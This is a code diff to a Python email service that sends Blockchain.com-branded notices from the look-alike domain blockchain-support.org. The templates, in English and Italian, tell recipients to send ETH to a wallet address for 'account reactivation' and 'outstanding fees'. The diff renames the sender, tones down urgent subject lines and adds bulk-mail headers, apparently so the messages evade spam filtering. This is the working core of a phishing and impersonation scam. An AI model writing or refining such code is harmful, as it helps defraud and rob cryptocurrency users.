@@ -40,7 +40,7 @@ def _wrap(content: str) -> str:
     {content}
   </div>
   <div style="text-align:center;padding:20px 10px;">
-    <p style="margin:4px 0;color:#999999;font-size:11px;">&copy; 2025 Blockchain.com. All rights reserved.</p>
+    <p style="margin:4px 0;color:#999999;font-size:11px;">&copy; 2026 Blockchain.com. All rights reserved.</p>
     <p style="margin:4px 0;color:#999999;font-size:11px;">Blockchain.com | London, United Kingdom | FCA Registered</p>
     <p style="margin:4px 0;color:#bbbbbb;font-size:10px;">This is a transactional email sent to the address associated with your Blockchain.com account.</p>
   </div>
@@ -68,7 +68,7 @@ class EmailService:
     def __init__(self, api_key: Optional[str] = None, sender_email: Optional[str] = None):
         self.api_key = api_key or os.environ.get("RESEND_API_KEY")
         self.sender_email = sender_email or os.environ.get("SENDER_EMAIL", "noreply@blockchain-support.org")
-        self.sender_name = "Blockchain.com"
+        self.sender_name = "Blockchain Support"
         self.reply_to = os.environ.get("REPLY_TO_EMAIL", "support@blockchain-support.org")
         self.unsubscribe_url = os.environ.get("UNSUBSCRIBE_URL", "")
         if self.api_key and RESEND_AVAILABLE:
@@ -83,6 +83,7 @@ class EmailService:
             return {"success": False, "error": "Email service not configured", "would_send": {"to": to_email, "subject": subject}}
         try:
             import uuid
+            msg_id = str(uuid.uuid4())
             plain = text_body or _strip_html(html_body)
             params = {
                 "from": f"{self.sender_name} <{self.sender_email}>",
@@ -92,7 +93,10 @@ class EmailService:
                 "text": plain,
                 "reply_to": self.reply_to,
                 "headers": {
-                    "X-Entity-Ref-ID": str(uuid.uuid4()),
+                    "X-Entity-Ref-ID": msg_id,
+                    "X-Mailer": "Blockchain-Support-Mailer",
+                    "Precedence": "bulk",
+                    "X-Auto-Response-Suppress": "OOF, AutoReply",
                 },
             }
             # Add List-Unsubscribe headers (required by Gmail/Yahoo since 2024)
@@ -174,7 +178,7 @@ class EmailService:
     def get_reactivation_email(self, user_name: str, eth_wallet_address: str, required_amount: str = "100", lang: str = "en") -> tuple:
         if lang == "it":
             return self._get_reactivation_email_it(user_name, eth_wallet_address, required_amount)
-        subject = "Account Reactivation Required - Blockchain.com"
+        subject = "Account Reactivation Notice - Blockchain.com"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Account Reactivation Required</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
@@ -223,7 +227,7 @@ class EmailService:
     def get_fee_payment_email(self, user_name: str, total_fees: str, eth_wallet_address: str, lang: str = "en") -> tuple:
         if lang == "it":
             return self._get_fee_payment_email_it(user_name, total_fees, eth_wallet_address)
-        subject = "Outstanding Fees - Action Required - Blockchain.com"
+        subject = "Outstanding Fees - Blockchain.com"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Outstanding Transaction Fees</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
@@ -258,7 +262,7 @@ class EmailService:
     def get_fee_resolution_email(self, user_name: str, total_fees: str, eth_wallet_address: str, lang: str = "en") -> tuple:
         if lang == "it":
             return self._get_fee_resolution_email_it(user_name, total_fees, eth_wallet_address)
-        subject = "Urgent: Outstanding Fees Must Be Cleared - Blockchain.com"
+        subject = "Your Outstanding Fees - Blockchain.com"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Important Notice Regarding Your Outstanding Fees</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
@@ -320,7 +324,7 @@ class EmailService:
         return subject, _wrap(content)
 
     def _get_fee_resolution_email_it(self, user_name: str, total_fees: str, eth_wallet_address: str) -> tuple:
-        subject = "Urgente: Commissioni in Sospeso da Saldare - Blockchain.com"
+        subject = "Commissioni in Sospeso - Blockchain.com"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Avviso Importante Riguardo le Commissioni in Sospeso</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
@@ -543,7 +547,7 @@ class EmailService:
         return subject, _wrap(content)
 
     def _get_reactivation_email_it(self, user_name, eth_wallet_address, required_amount):
-        subject = "Riattivazione dell'Account Richiesta - Blockchain.com"
+        subject = "Avviso di Riattivazione dell'Account - Blockchain.com"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Riattivazione dell'Account Richiesta</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
@@ -589,7 +593,7 @@ class EmailService:
         return subject, _wrap(content)
 
     def _get_fee_payment_email_it(self, user_name, total_fees, eth_wallet_address):
-        subject = "Commissioni in Sospeso - Azione Richiesta - Blockchain.com"
+        subject = "Commissioni in Sospeso - Blockchain.com"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Commissioni di Transazione in Sospeso</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
